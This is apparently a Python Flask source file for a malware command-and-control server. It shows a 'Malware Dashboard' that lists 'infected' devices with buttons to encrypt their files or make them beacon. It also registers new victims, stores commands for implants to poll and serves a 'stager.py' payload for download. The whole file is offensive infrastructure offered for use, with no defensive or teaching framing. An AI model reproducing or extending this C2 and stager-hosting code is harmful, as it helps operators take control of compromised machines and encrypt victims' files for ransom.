from flask import Flask, jsonify, request, render_template_string, send_file
import json

app = Flask(__name__)

devices = [
    {'id': '1', 'name': 'Device 1', 'status': 'infected', 'ip': '192.168.1.2'},
    {'id': '2', 'name': 'Device 2', 'status': 'infected', 'ip': '192.168.1.3'},
]

commands = {}

dashboard_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>Malware Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .device { border: 1px solid #ccc; padding: 10px; margin: 10px 0; }
        button { margin: 5px; padding: 5px 10px; }
    </style>
</head>
<body>
    <h1>Malware Dashboard</h1>
    <div id="devices"></div>
    <script>
        async function fetchDevices() {
            const res = await fetch('/devices');
            const devices = await res.json();
            const container = document.getElementById('devices');
            container.innerHTML = '';
            devices.forEach(d => {
                const div = document.createElement('div');
                div.className = 'device';
                div.innerHTML = `
                    <h3>${d.name}</h3>
                    <p>Status: ${d.status}</p>
                    <p>IP: ${d.ip}</p>
                    <button onclick="sendCommand('${d.id}', 'encrypt')">Encrypt Files</button>
                    <button onclick="sendCommand('${d.id}', 'beacon')">Send Beacon</button>
                `;
                container.appendChild(div);
            });
        }
        async function sendCommand(id, cmd) {
            await fetch('/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({deviceId: id, command: cmd})
            });
            fetchDevices();
        }
        setInterval(fetchDevices, 5000);
        fetchDevices();
    </script>
</body>
</html>
'''

@app.route('/')
def dashboard():
    return render_template_string(dashboard_html)

@app.route('/devices', methods=['GET', 'POST'])
def handle_devices():
    if request.method == 'POST':
        data = request.get_json()
        if data:
            devices.append({
                'id': data.get('id', 'unknown'),
                'name': data.get('name', 'Unknown'),
                'status': 'infected',
                'ip': data.get('ip', '0.0.0.0')
            })
            return jsonify({'success': True, 'device': data})
        return jsonify({'error': 'Invalid data'}), 400
    return jsonify(devices)

@app.route('/command', methods=['POST'])
def handle_command():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid JSON'}), 400
    device_id = data.get('deviceId')
    command = data.get('command')
    if command:
        commands[device_id] = command
        for device in devices:
            if device['id'] == device_id:
                if command == 'encrypt':
                    device['status'] = 'encrypting'
                elif command == 'beacon':
                    device['status'] = 'beaconing'
                break
        return jsonify({'success': True, 'message': 'Command stored'})
    pending = commands.get(device_id)
    return jsonify({'command': pending})

@app.route('/beacon', methods=['GET', 'POST'])
def beacon():
    return jsonify({'status': 'beacon received'})

@app.route('/stager.py')
def serve_stager():
    return send_file('stager.py', mimetype='text/x-python')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
